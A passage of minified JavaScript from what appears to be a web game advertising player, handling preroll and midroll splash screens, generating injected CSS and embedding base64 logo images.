d='M772.15,484a3.42,3.42,0,0,1-.08-4.58,3.75,3.75,0,0,1,2.55-.75h2.87l.13,1.59h-3a1.71,1.71,0,0,0-1.16.35,1.36,1.36,0,0,0-.38,1.05,1.32,1.32,0,0,0,.51,1.14,2.7,2.7,0,0,0,1.55.37,4.48,4.48,0,0,0,1.69-.25.8.8,0,0,0,.56-.75l.2,1.41a2.28,2.28,0,0,1-.64.67,2.57,2.57,0,0,1-.89.39,4.45,4.45,0,0,1-1.14.14A4.21,4.21,0,0,1,772.15,484Zm5.25-5.75a2.13,2.13,0,0,0-.53-1.54,2,2,0,0,0-1.5-.55,3.69,3.69,0,0,0-1.18.19,3.48,3.48,0,0,0-1,.51l-1.45-1a3.74,3.74,0,0,1,1.51-1.07,5.39,5.39,0,0,1,2.08-.39,4.74,4.74,0,0,1,2.15.45,3,3,0,0,1,1.35,1.28,4.1,4.1,0,0,1,.47,2v6.47H777.4Z' transform='translate(-689.82 -249.4)'/%3E%3Cpath class='cls-5' d='M782.88,480.65a2.31,2.31,0,0,0,.53,1.64,2,2,0,0,0,1.52.57,2.11,2.11,0,0,0,1.51-.51,2,2,0,0,0,.53-1.47l.13,2.11a2.84,2.84,0,0,1-2.72,1.76,3.2,3.2,0,0,1-2.58-1.08,4.55,4.55,0,0,1-.9-3v-6.12h2Zm4.09-6.12h2V484.6h-2Z' transform='translate(-689.82 -249.4)'/%3E%3Cpath class='cls-5' d='M792.44,484.57a6.32,6.32,0,0,1-1.46-.52,6,6,0,0,1-1.25-.88l1.17-1.44a7.13,7.13,0,0,0,1.62.93,4.37,4.37,0,0,0,1.6.31,3.45,3.45,0,0,0,1.76-.36,1.21,1.21,0,0,0,.58-1.09.83.83,0,0,0-.32-.73,1.89,1.89,0,0,0-.79-.33c-.32,0-.77-.1-1.34-.15h-.17l-.16,0h-.16a7.83,7.83,0,0,1-1.66-.28,2.32,2.32,0,0,1-1.13-.78,2.62,2.62,0,0,1-.45-1.64,3.35,3.35,0,0,1,.44-1.78,2.66,2.66,0,0,1,1.3-1.06,5.67,5.67,0,0,1,2.16-.36,7.2,7.2,0,0,1,1.5.15A6.74,6.74,0,0,1,797,475a6.15,6.15,0,0,1,1.26.73l-1.2,1.44a6.61,6.61,0,0,0-1.49-.73,4.52,4.52,0,0,0-1.43-.24,2.7,2.7,0,0,0-1.51.34,1.17,1.17,0,0,0-.5,1,.7.7,0,0,0,.28.61,1.67,1.67,0,0,0,.72.27c.3.05.71.08,1.25.12h.36a8.31,8.31,0,0,1,1.8.28,2.41,2.41,0,0,1,1.25.84,2.85,2.85,0,0,1,.51,1.83,3.2,3.2,0,0,1-.47,1.79,2.81,2.81,0,0,1-1.4,1.08,6.64,6.64,0,0,1-2.35.36A7.46,7.46,0,0,1,792.44,484.57Z' transform='translate(-689.82 -249.4)'/%3E%3Cpath class='cls-5' d='M801.2,484.22a3.51,3.51,0,0,1-1.51-1.54,5.38,5.38,0,0,1-.51-2.45V479.1a5.8,5.8,0,0,1,.5-2.55,3.5,3.5,0,0,1,1.45-1.61,4.44,4.44,0,0,1,2.29-.56,3.64,3.64,0,0,1,2.15.64,3.89,3.89,0,0,1,1.36,1.82,7.65,7.65,0,0,1,.47,2.86v.66h-6.79v-1.59h4.91a3.4,3.4,0,0,0-.64-1.92,1.78,1.78,0,0,0-1.46-.68,2.15,2.15,0,0,0-1.75.74,3.15,3.15,0,0,0-.61,2.08v1.28a2.6,2.6,0,0,0,.66,1.92,2.49,2.49,0,0,0,1.87.67,3.12,3.12,0,0,0,1.19-.24,3.38,3.38,0,0,0,1.06-.68l1.3,1.3a5.46,5.46,0,0,1-1.68,1.11,4.8,4.8,0,0,1-1.87.4A5.05,5.05,0,0,1,801.2,484.22Z' transform='translate(-689.82 -249.4)'/%3E%3Cpath class='cls-5' d='M810,484.29a3.05,3.05,0,0,1-1.19-1.4,5.46,5.46,0,0,1-.4-2.21v-2.22a5.65,5.65,0,0,1,.39-2.22,3.06,3.06,0,0,1,1.16-1.4,3.37,3.37,0,0,1,1.83-.48,3,3,0,0,1,1.64.46,3.54,3.54,0,0,1,1.2,1.31l-.21,2.06a2.48,2.48,0,0,0-.23-1.1,1.62,1.62,0,0,0-.68-.69,2.2,2.2,0,0,0-1.07-.24,1.92,1.92,0,0,0-1.52.61,2.56,2.56,0,0,0-.53,1.72v2.19a2.46,2.46,0,0,0,.53,1.69,1.94,1.94,0,0,0,1.52.6,2.09,2.09,0,0,0,1.07-.25,1.61,1.61,0,0,0,.68-.71,2.54,2.54,0,0,0,.23-1.12l.14,2.13a2.85,2.85,0,0,1-1,1.25,2.7,2.7,0,0,1-1.68.5A3.54,3.54,0,0,1,810,484.29Zm4.42-13.8h2V484.6h-2Z' transform='translate(-689.82 -249.4)'/%3E%3Cg transform='rotate(180 50 50)'%3E%3Crect x='33' y='-82.5' width='5' height='40' fill='%234285f4'%3E%3C/rect%3E%3Crect x='18' y='-82.5' width='5' height='40' fill='%23ea4335'%3E%3C/rect%3E%3Crect x='3' y='-82.5' width='5' height='40' fill='%23fbbc05'%3E%3C/rect%3E%3Crect x='-13' y='-82.5' width='5' height='40' fill='%234285f4'%3E%3C/rect%3E%3Crect x='-27' y='-82.5' width='5' height='40' fill='%2334a853'%3E%3C/rect%3E%3Crect x='-42' y='-82.5' width='5' height='40' fill='%23ea4335'%3E%3C/rect%3E%3C/g%3E%3C/svg%3E\");\n            }")
            },
            rk: function() {
                a.ac.classList.remove("wgHidden")
            },
            Ch: function() {
                a.ac.classList.add("wgHidden")
            },
            fl: function(b, c) {
                if (!b || !c) return !1;
                var d;
                "preroll" === b && (d = a.ja.getElementsByClassName("wgTitle")[0]);
                "midroll" === b && (d = a.la.getElementsByClassName("wgTitle")[0]);
                d.innerText = c
            },
            lm: function(b) {
                var c = arguments,
                    d = 1;
                return b.replace(/%(s|d|0\d+d)/g, function(e, g) {
                    e = c[d++];
                    switch (g) {
                        case "s":
                            return e;
                        case "d":
                            return parseInt(e, 10);
                        default:
                            return e = String(parseInt(e, 10)), "0".repeat(Number(g.slice(1, -1))).slice(e.length) +
                                e
                    }
                })
            },
            xg: -1,
            updateSplash: function(b, c) {
                if ("undefined" !== typeof a.options.afv || !b || 0 === b.toString().length || "object" !== typeof c) return !1;
                var d, e, g, p;
                a.xg = setInterval(function() {
                    if ("preroll" === b || "midroll" === b)
                        if (clearInterval(a.xg), a.xg = -1, g = "preroll" === b ? a.Ra() : a.ad(), c.title && (g.getElementsByClassName("wgTitle")[0].innerText = c.title), c.cta && (g.querySelectorAll(".wgPrerollCTA span")[0].innerText = c.cta), c.desc && (g.querySelectorAll(".wgPrerollDescription")[0].innerText = c.desc), c.wb && a.options.wb && (g.querySelectorAll(".wgPrerollWb span")[0].innerText = c.wb), c.img) {
                            var m = g.querySelectorAll(".wgThumb > div");
                            for (d in m) "object" === typeof m[d] && m[d].setAttribute("style", 'background-image:url("' + a.zc.thumb + c.img + '") !important');
                            if (a.fa)
                                for (p in m = a.fa.querySelectorAll(".wgThumbnail.small"), m) "object" === typeof m[p] && m[p].setAttribute("style", 'background-image:url("' + a.zc.thumb + c.img + '") !important');
                            m = g.querySelectorAll(".wgBgImage");
                            for (e in m) "object" === typeof m[e] && m[e].setAttribute("style", 'background-image:url("' + a.zc.bg + c.img + '") !important')
                        }
                }, 10)
            },
            fk: function() {
                if ("object" === typeof a.options.afv) return !1;
                var b, c = ["preroll", "midroll"],
                    d;
                for (d in c)
                    if (b = a[c[parseInt(d, 10)] + "Splash"]) {
                        b.getElementsByClassName("wgTitle")[0].innerText = a.ub(a.options.gameName, a.options.titleExtract);
                        "preroll" === d && (b.querySelectorAll(".wgPlayGame span")[0].innerText = a.options.playGameText);
                        "midroll" === d && (b.querySelectorAll(".wgPlayGame span")[0].innerText = a.options.continueGameText);
                        var e = b.getElementsByClassName("wgThumbnail"),
                            g;
                        for (g in e) "object" === typeof e[g] && (e[g].style.backgroundImage = "");
                        b = b.getElementsByClassName("wgBg");
                        for (var p in b) "object" === typeof b[p] && (b[p].style.backgroundImage = "")
                    }
            },
            Kk: null,
            Ki: function() {
                var b = a.nh();
                a.Kk = b;
                a.ia = a.F("div", "", b);
                a.ia.setAttribute("data-wgplayer", !0);
                a.options.mainClassName && a.ia.classList.add(a.options.mainClassName)
            },
            u: function() {
                return a.ia
            },
            td: function() {
                a.ia && a.ia.parentNode && (a.ia.classList.add("removed"), a.Jc())
            },
            fh: function() {
                a.ia && a.ia.parentNode && a.ia.parentNode.removeChild(a.ia)
            },
            vb: function(b) {
                b = void 0 === b ? !0 : b;
                0 === a.u().getBoundingClientRect().width && 0 === a.u().getBoundingClientRect().height && a.G().insertBefore(a.ia, a.G().firstChild);
                !1 === b ? a.ia.classList.add("wgOffViewport") : a.ia.classList.remove("removed");
                !0 === a.Pa && a.Fa(!0);
                a.Ed();
                a.contextMenu && a.contextMenu.uk()
            },
            nh: function(b) {
                b = void 0 === b ? -1 : b; - 1 === b && (b = 20);
                for (var c = "", d = 0; d < b; d++) c += "1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".charAt(Math.floor(124 * Math.random()));
                return c.trim().toLowerCase()
            },
            Td: function() {
                a.ja && a.ja.parentNode && a.ja.parentNode.removeChild(a.ja);
                a.la && a.la.parentNode && a.la.parentNode.removeChild(a.la);
                a.Jc()
            },
            Ed: function() {
                a.G().classList.add("wgContent")
            },
            Jc: function() {
                a.G().classList.remove("wgContent");
                a.G().classList.remove("wgSafeWidth");
                a.G().classList.remove("wgSafeHeight")
            },
            pe: {
                w: 0,
                h: 0
            },
            Bh: !1,
            Ah: !1,
            hl: function() {
                if (400 > a.G().getBoundingClientRect().width && !1 === a.Bh) {
                    if (-1 == a.options.minWidth.indexOf("px")) return !1;
                    a.pe.w = a.G().getBoundingClientRect().width;
                    return a.Bh = !0
                }
                a.pe.w = a.G().getBoundingClientRect().width;
                return !0
            },
            gl: function() {
                if (300 > a.G().getBoundingClientRect().height && !1 === a.Ah) {
                    if (-1 == a.options.minHeight.toString().indexOf("px")) return !1;
                    a.pe.h = a.G().getBoundingClientRect().height;
                    return a.Ah = !0
                }
                a.pe.h = a.G().getBoundingClientRect().height;
                return !0
            },
            Dl: function() {
                return "object" === typeof a.options.gameThumbnail ? a.options.gameThumbnail.image : a.options.gameThumbnail
            },
            containerName: null,
            styleSheet: null,
            Ai: function() {
                var b = document.createElement("link");
                document.head.appendChild(b);
                b.href = "https://fonts.googleapis.com/css?family=Roboto:400,500&display=swap";
                b = [];
                b = "object" === typeof a.options.background ? [a.options.background[0], a.options.background[1] ? a.options.background[1] : "0,0,0,0.5"] : "string" === typeof a.options.background.toLowerCase() ? [a.options.background, a.options.background] : ["rgba(0,0,0,0.9", "0,0,0,0.5"];
                var c = a.options.gameBackground ? a.options.gameBackground.replace(/^\s*[\r\n]/gm, "").trim() : "",
                    d = a.options.mainClassName ? "." + a.options.mainClassName : "#" + a.ia.id.trim().toLowerCase();
                a.containerName = d;
                var e = ".wgAllowFlash,.wgTable{border-radius:5px;overflow:visible;}.wgAllowFlash{width:500px;padding:10px; position:absolute; margin-left:-250px; top:10%; left:50%;}.wgTable{width:100%;display:table;}.wgTable:nth-child(2){margin-bottom:0}.wgTable>div{display:table-cell;vertical-align:middle;padding:10px;text-align:left;width:auto;background:#fff; color:#272727;}.wgTable>div:first-child{width:1%;white-space:nowrap;font-size:22px;font-weight:600;vertical-align:top}.wgAllowFlash{ z-index:10000; position:absolute; pointer-events:none;}[data-wgplayer] div video{width:100% !important; height:100% !important;}[data-wgplayer] div lima-video{width:100% !important; height:100% !important;}.wgContent video{left:0; top:0;}.wgSafeWidth{ width:600px; }.wgSafeHeight{ height:600px; }.wgContent{ top:0; left:0; }";
                e = a.Ca() ? e + ".wgMidroll{ position:fixed !important; top:0; left:0;}" : e + ".wgMidroll{ position:absolute !important; top:0; left:0; }";
                window.getComputedStyle(a.G(), null).getPropertyValue("position");
                e = e + ".lowZi{ z-index:-1 !important; }.wgFixed{ position:fixed !important; }.wgHidden{ display:none !important; visibility:hidden; }.wgVisible{ display:block !important; visibility:visible; }.removed{position:fixed !important; pointer-events:none; user-select:none; position:fixed; overflow:hidden; z-index:-1000; opacity:0; transform:translateX(-10000px) !important; transition:none!important;}.wgBg .wgBgImage{background-image: " +
                    ((c ? "url('" + a.zc.bg + c + "')" : "none") + " !important;}");
                e += '.wgLogo{\n                position:absolute;\n                z-index:2147483647;\n                cursor:pointer;\n                width:25px;\n                height:25px;\n                bottom:10px;\n                right:10px;\n                background-position:center;\n                background-size:contain;\n                background-repeat:no-repeat;\n                background-image:url(data:image/svg+xml;base64,PHN2ZyBpZD0iSXNvbGF0aW9uX01vZGUiIGRhdGEtbmFtZT0iSXNvbGF0aW9uIE1vZGUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgdmlld0JveD0iMCAwIDI3LjIxIDIxLjMyIj48ZGVmcz48c3R5bGU+LmNscy0xe2ZpbGw6IzkxOTA5MTt9LmNscy0ye2ZpbGw6I2VkMjIyNDt9PC9zdHlsZT48L2RlZnM+PHBhdGggY2xhc3M9ImNscy0xIiBkPSJNNTA0LDQ5OS4yNWMuMDgtLjIuMTQtLjM0LjItLjQ3bDEuMS0yLjZjLjItLjQ2LjM4LS45MS41Ny0xLjM3bC4zNi0uODMuNjYtMS41NWMuMzgtLjg3Ljc3LTEuNzQsMS4xNS0yLjYycy43LTEuNjksMS4wNi0yLjUzLjY0LTEuNDMuOTUtMi4xNWMuMTktLjQ2LjM2LS45NC41Ni0xLjRzLjQ3LTEuMDkuNy0xLjYzLjQyLTEuMDYuNjQtMS41OC40Ny0xLjA5LjcxLTEuNjNsLjM1LS44MmMuMTIsMCwuMjcsMCwuNDMsMGwzLjIzLDBjLjUxLDAsLjU5LjA2Ljc3LjU0YTEuNywxLjcsMCwwLDEsLjE4LjQ0LDEuMTUsMS4xNSwwLDAsMSwwLC41OGMtLjMuNzYtLjY0LDEuNTEtMSwyLjI2LS4yNC41OC0uNDYsMS4xNi0uNywxLjczcy0uNTksMS4zMy0uODgsMmMtLjQzLDEtLjg0LDItMS4yNywzLS4yNS42LS41MSwxLjE5LS43NiwxLjc5LS4zNy44Ny0uNzIsMS43NC0xLjA4LDIuNjFsLS43LDEuNjVjLS4yMS41MS0uNCwxLS42MiwxLjU1LS4xNC4zNC0uMzIuNjctLjQ4LDFhNy43LDcuNywwLDAsMS0uMzMuNzEsMy4xMiwzLjEyLDAsMCwxLTEuOCwxLjMyLDYuMjYsNi4yNiwwLDAsMS0xLjcyLjE1Yy0uNjMsMC0xLjI2LDAtMS44OSwwQzUwNC4zMiw0OTkuMzEsNTA0LjE5LDQ5OS4yNyw1MDQsNDk5LjI1WiIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoLTQ5MC40NyAtNDc4LjAxKSIvPjxwYXRoIGNsYXNzPSJjbHMtMSIgZD0iTTQ5OS44Miw0OTkuMjVhLjkxLjkxLDAsMCwxLS4yNS4wN2wtMy43OSwwYS42My42MywwLDAsMS0uMjMtLjA3bC0uNDEtLjk0YS43Ni43NiwwLDAsMSwwLS42OWMuMzItLjcuNjMtMS40MS45My0yLjEyLjM3LS44OC43My0xLjc3LDEuMTEtMi42NC4yNC0uNTcuNTEtMS4xMy43Ni0xLjdzLjM3LS45LjU3LTEuMzVjLjI2LS42Mi41NC0xLjIzLjc5LTEuODZzLjYtMS40Ny45LTIuMjFjLjE4LS40Mi4zOC0uODQuNTYtMS4yN3EuMTUtLjMzLjI3LS42NmE0LjQ5LDQuNDksMCwwLDEsLjkxLTEuNTEsNC41Niw0LjU2LDAsMCwxLC44My0uNjgsMS42NiwxLjY2LDAsMCwxLC41MS0uMTMsNS42Myw1LjYzLDAsMCwxLDEuNTktLjE4Yy41NSwwLDEuMSwwLDEuNjUsMGExLjI0LDEuMjQsMCwwLDEsLjg2LjIxYy0uMDYuMTktLjEyLjM2LS4xOS41My0uMjguNjMtLjU4LDEuMjUtLjg1LDEuODgtLjQyLDEtLjgyLDItMS4yNCwzLS4yMS41MS0uNDQsMS0uNjYsMS41M2wtLjY2LDEuNTNjLS4yNi42LS41NCwxLjItLjgsMS44MXMtLjQ3LDEuMi0uNzIsMS44Yy0uMTguNDQtLjM4Ljg3LS41NiwxLjMxLS4yNy42NC0uNTIsMS4yOS0uOCwxLjk0LS4xOC40My0uMzkuODYtLjU5LDEuMjlaIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgtNDkwLjQ3IC00NzguMDEpIi8+PHBhdGggY2xhc3M9ImNscy0yIiBkPSJNNDkzLDQ5My40Yy0uMjQtLjQ4LS40OS0xLS43MS0xLjQ3LS4zLS42Ny0uNTctMS4zNi0uODYtMnMtLjY0LTEuNC0xLTIuMWEuNTEuNTEsMCwwLDEsLjA2LS41NSw2LjY2LDYuNjYsMCwwLDAsLjUzLTEuMDcsMy40OCwzLjQ4LDAsMCwxLDIuMTEtMS45MywyLjgxLDIuODEsMCwwLDEsMS4yMi0uMTcsMTEuNjMsMTEuNjMsMCwwLDAsMS4zMiwwYy40MiwwLC44MywwLDEuMjUsMHMuNDQuMS4yOC40N2MtLjI5LjY4LS41NSwxLjM3LS44OSwyLS40OS45NS0uOTEsMS45My0xLjM1LDIuOTEtLjI1LjU2LS41NSwxLjEtLjgsMS42NnMtLjYsMS4zOC0uODgsMi4wOEM0OTMuMyw0OTMuMzYsNDkzLjI0LDQ5My40NSw0OTMsNDkzLjRaIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgtNDkwLjQ3IC00NzguMDEpIi8+PC9zdmc+);\n            }.wgLogo:hover{\n                transition:.3s;\n                transform:scale(1.1);\n            }.wgPlayGame{ transform: translateY(-35px ); display: inline-block; background: #99c506; background: -webkit-linear-gradient(#aed409,#77952b); background: -o-linear-gradient(#aed409,#77952b); background: -moz-linear-gradient(#aed409,#77952b); background: linear-gradient(#aed409,#77952b); padding: 10px 20px; border-radius: 10px; border: 3px solid #fff; color: #fff; text-decoration: none; font-size: 17px; font-weight: 900; text-transform: uppercase; position: relative; bottom: 0; white-space: nowrap; cursor: pointer; text-shadow: 1px 1px #505050;transition: all .2s; }.wgAllowFlash .wgPlayGame{ transform: translateY(0px );}.wgPlayGame:after{ content: "\\00bb";  position: relative; opacity: 0; right: 5px; transition: .5s;}';
                e = a.options.gameThumbnail && "object" === typeof a.options.gameThumbnail ? e + (".wgThumbnail.small, .wgThumb > div{background-image:url('" + a.Zc(a.zc.thumb + a.options.gameThumbnail.image) + "');}") : e + (".wgThumbnail.small, .wgThumb > div{ background-image: url('" + a.Zc(a.zc.thumb + a.options.gameThumbnail) + "');}");
                "undefined" !== typeof a.options.gameLogo && (e += ".wgPrerollLogo, .wgPrerollLogoBottom{ background-image: url('" + a.options.gameLogo + "');}");
                e += ".wgThumbnail.small{width:120px; height:120px; border:3px solid #fff; margin:10px; display:inline-block; background-size:cover; background-position:center center;}.wgCenter{ width:100%; height:100%; text-align:center; display: block; text-align: center; vertical-align: middle; }.wgCenterTable{ width:auto; text-align:center; display: table;  padding: 10px 10px 20px 10px;}.wgCenterTable>div{ display: table-cell; text-align:left; vertical-align:middle; font-size:22px;}.wgCenterTable>div:nth-child(2){ padding:10px 30px; text-align:center; display:inline-block;}.wgClear{ display:block; text-align:center; }.wgPreTable{background: #272727; border-radius: 10px; padding: 10px 10px 10px 10px; margin-bottom: 10px; color:#fff; text-align:left;}.wgPreTable:nth-child(2){background:#8e8e8e; padding:10px;}";
                "100%" === a.options.minWidth ? "undefined" !== typeof a.options.hj && !1 !== a.options.hj ? (e += d + "{ width:" + a.ic().w + "px; }", e += d + "{ min-width:100%; }") : e += d + "{ width:" + a.options.minWidth + "; }" : e += d + "{ width:" + a.options.minWidth + "; }";
                "100%" === a.options.minHeight ? (e += d + "{  height:100%; }", a.isMobile() || (e = e + (d + "{ min-height:100%; }") + (d + "{ max-height:100%; }"))) : e += d + "{  height:" + a.options.minHeight + "; }";
                e = e + (d + "{ background-color:#000; overflow:hidden; }") + (d + "{ \n                " + (!0 === a.options.fitParent ? "" : "padding:inherit;") + "\n                " + (!0 === a.options.fitParent ? "height:" + a.G().getBoundingClientRect().height + "px;" : "") + "\n                box-sizing: border-box; \n                overflow:hidden; \n                " + (a.options.containerPosition ? "position:" + a.options.containerPosition : "") + "; \n                z-index:" + u + "; \n            }");
                e = e + ("body > " + d + "{position:fixed !important;}") + (d + ".wgMidroll{ background:rgba(0,0,0,1); }") + (d + " > div:first-child{ z-index:2147483647; }") + (d + ".wgNoClick > div:first-child{ z-index:2147483646; }") +
                    (d + ":not(.wgAdLoaded) > div:not([class]){ pointer-events:none; }.wgSafeSize{ width:600px; height:400px; }");
                a.wd() && (e += d + "{ \n                    overflow:hidden; \n                    width:" + a.options.minWidth + "; \n                    height:" + a.options.minHeight + ";\n                    position:" + (a.options.mobilePosition ? a.options.mobilePosition : "fixed") + "; \n                    z-index:" + u + "; \n                    top:0; \n                    left:0; \n                    max-width:100vw; \n                }", e += d + ".wgInited{\n                    width:" + a.ka.w + "px !important; \n                    height:" + a.ka.h + "px !important;\n                }");
                a.oe && !a.isMobile() && (e += d + "{ position:absolute !important; }.wgContent{position:relative;}");
                "relative" === a.options.containerPosition && (e += ".wgRelative{position:relative;}");
                e += "#" + a.ia.id.trim().toLowerCase() + " ." + a.ya.classList[0] + "{position: absolute; width: 100%; height: 100%; top: 0px; left: 0px; background: rgba(0,0,0,1); color: rgb(255, 255, 255); display: block; z-index: " +
                    u + "; }";
                !0 !== a.options.loading && (e += "#" + a.ia.id.trim().toLowerCase() + " ." + a.ya.classList[0] + " > div{ display:none; }");
                e += "#" + a.ia.id.trim().toLowerCase() + " ." + a.ya.classList[0] + " > div{width: 25px; height: 25px; position: absolute; top: 50%; left: 50%; margin-left: -15px; margin-top: -15px; animation: circle 0.75s linear infinite; border-width: 2px; border-style: solid; border-color: rgba(252, 12, 12, 0) rgb(255, 255, 255) rgba(201, 62, 201, 0) rgb(255, 255, 255); border-image: initial; border-radius: 100%; -webkit-animation: spin 1s linear infinite; animation: spin 1s linear infinite; transform-origin: center !important;}";
                e = e + "@-webkit-keyframes spin {0% { -webkit-transform: rotate(0deg); }100% { -webkit-transform: rotate(360deg); }}@keyframes spin {0% { transform: rotate(0deg); }100% { transform: rotate(360deg); }}@keyframes wgTicTac {0% {transform: scale(1, 1);}50% {transform: scale(1.2, 1.2);}100% {transform: scale(1, 1);}}.wgResumeAdButton{ display:flex; overflow:hidden; cursor:pointer; position:absolute;  width:100px; height:100px; border-radius:50%; background-color:rgba(0,0,0,.8); margin: auto; top: 0; left: 0; bottom: 0; right: 0; transition:0.2s; z-index:2147483647;}.wgResumeAdButton{ z-index:2147483647;}.wgResumeAdButton:hover{ background-color:rgba(0,0,0,1);  z-index:2147483647;}.wgResumeAdButton::before{\n                display: flex; \n                align-items: center; \n                margin:auto; \n                font-size:40px; \n                text-align:center; \n                color:#fff; \n                width:38px; \n                height:38px; \n                content:' '; \n                background:url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACQAAAAmCAYAAACsyDmTAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyRpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDcuMS1jMDAwIDc5LmRhYmFjYmIsIDIwMjEvMDQvMTQtMDA6Mzk6NDQgICAgICAgICI+IDxyZGY6UkRGIHhtbG5zOnJkZj0iaHR0cDovL3d3dy53My5vcmcvMTk5OS8wMi8yMi1yZGYtc3ludGF4LW5zIyI+IDxyZGY6RGVzY3JpcHRpb24gcmRmOmFib3V0PSIiIHhtbG5zOnhtcD0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wLyIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VSZWYjIiB4bXA6Q3JlYXRvclRvb2w9IkFkb2JlIFBob3Rvc2hvcCAyMi41IChXaW5kb3dzKSIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDo1NzAyODQzNDUxMDUxMUVDOTUzQTk5NTJDNTY0ODYyRSIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDo1NzAyODQzNTUxMDUxMUVDOTUzQTk5NTJDNTY0ODYyRSI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSJ4bXAuaWlkOjU3MDI4NDMyNTEwNTExRUM5NTNBOTk1MkM1NjQ4NjJFIiBzdFJlZjpkb2N1bWVudElEPSJ4bXAuZGlkOjU3MDI4NDMzNTEwNTExRUM5NTNBOTk1MkM1NjQ4NjJFIi8+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRhPiA8P3hwYWNrZXQgZW5kPSJyIj8+GNdJXQAAA9FJREFUeNrMmN9LU2EYx885O+6HmDpwSYEKSmlCCl24XU1QsX9AL7oxvKluQm8qC8ougsjEQRGLvJK8KROSTGikSIjCQDaVVl5s6jZhusxN5+acO6fnXee1s3nU/Thn9sDLeXE/zmff5/s873MkWZYl5ufnCX7U1taSRELMzc2xhIQB94xdafwHkiSJmpoaPgh/z2JIqcEovEEwy8vL137/jZ9or9VqKQ4MX2PqCSkoOhCKgoKCV/n5+YWwLhYXFw+OjY1NLSws6Lj3UYlgkgPRNF0ok8kItBQKBQFg2vLy8m+rq6v9JpPpfCKYFGpRR72APAWAhEqlojQazXWdTvd9ZWXlQUdHh5JT6WCJCUbiKkNfuL29zeTl5Qm+kWEYIhKJEMFg0O71eu9XVlZ+RGZPWGlXJK4yiueHY38hRVE4jRUlJSXv19fXv5rN5sti+4tK9QPIX0qlklCr1frq6moz+Ovl0NDQWbH8RaWVZ85fubm5NPjrZnNzs21pael2e3t7Tqb+inmIRHeAPXgoepSHjguev35AKu9WVVV9SdVfcR7KuFTBX3K5HPnrUmlp6ae1tbWR6enpC2n5CymEuzEoxGYaoBYLarHwXWG3220YGBhA/kKplCXAkaAWgZdkQHywcDjM+nw+r91uv1FfX6/gzk5BMMmBcESjUTYUCrEbGxsWm83WxKnFB4tvOVIDYbX29/fZnZ0d1uPxvJucnKw4EiwbQHywvb095K+gy+V6ajAY1IegsgnETyPyF4w5TqvV2sQ3vSh9KN2ANBJ+v99dVFSEUsggB1HE/xEHxqZP4+4oK1xn98BkekvSxpikqcMA0tPd3a2B+6L5Sn5g7lMo+5HR0VE0tqh4MP86eTYa4+7uLmqMttnZ2as8EEWcMlKXPe/o+LW4uNjZ2Nh4JgEkO40RH66BQCDidDpf9/X1nRNIT3aODuQTqBzkE9P4+PiVhPTkJHO4ilL2eEAD0zpg5LgHM89ngQGNwRrggU1oWKMz7Seo28Jp7odJ8VlXV5dxeHh4VwCGPQkkIyAEAtVDQE9hNjc3BycmJh63tbV5eEqw6T4ipQyEQFB6tra2pqB67ur1eqtAavgQbDIgKQMhn6D0gGld8OjzqKGhAT2bMZmkJy0g7BPoKSEAeN7b2/vCaDQGj0lNWiBxQOjD+DGED4JU4Zrbh5mZmYctLS1OMXyStEKgRAA8EhuIuDK2OhyOzrq6OrOYPkkaCIx6By49oIwPqudJa2vrW4vFktg/REvPiUBlZWVv4NJ/qJ0LA0ny7z1a4KZCe0KK9AjFHwEGAHovhV3ojVdJAAAAAElFTkSuQmCC') no-repeat center center transparent;\n            }.wgsoundButton{ display:inline-block; cursor:pointer; position:absolute; overflow:hidden; width:38px; height:38px; border:10px solid transparent; border-radius:50%; background-color:rgba(0,0,0,.8); background-image:url(\"" +
                    (a.mad.Lb.yb + '"); background-repeat:no-repeat; background-position:center; top:40px; right:20px; transition:0.2s; z-index:2147483615;}');
                a.options.poster && a.options.poster.pre && (e += ".wgPrerollImageSplashBg{ position:absolute; top:0; left:0; width:100%; height:100%; z-index:" + v + "; background-image:url('" + a.Zc(a.options.poster.pre) + "'); background-size:cover; background-position:center center; }", e += ".wgPrerollImageSplashBg ~ .wgCenter{ opacity:0; }");
                a.options.poster && a.options.poster.mid && (e += ".wgMidrollImageSplashBg{ position:absolute; top:0; left:0; width:100%; height:100%; z-index:" +
                    v + "; background-image:url('" + a.Zc(a.options.poster.mid) + "'); background-size:cover; background-position:center center; }", e += ".wgMidrollImageSplashBg ~ .wgCenter{ opacity:0; }");
                e += ".wgFlashSplash:before {display:table;  content: ' '; top: 0; left: 0; width:100%; height:100%; overflow:hidden; position:absolute; -webkit-filter: blur(45px); -moz-filter: blur(45px); -o-filter: blur(45px);-ms-filter: blur(45px);filter: blur(45px); background-color:" + b[1] + "; background-size: cover; background-image: " +
                    (c ? "url('" + c + "')" : "none") + ";}";
                e += ".wgFlashSplash{  transform:translateY(0px); display:table; width:100%; height:100%; position:absolute; top:0; left:0;  cursor:pointer; overflow:hidden; z-index:-10000000; background-size:cover; background-position: center center; background-color:" + b[1] + ";}";
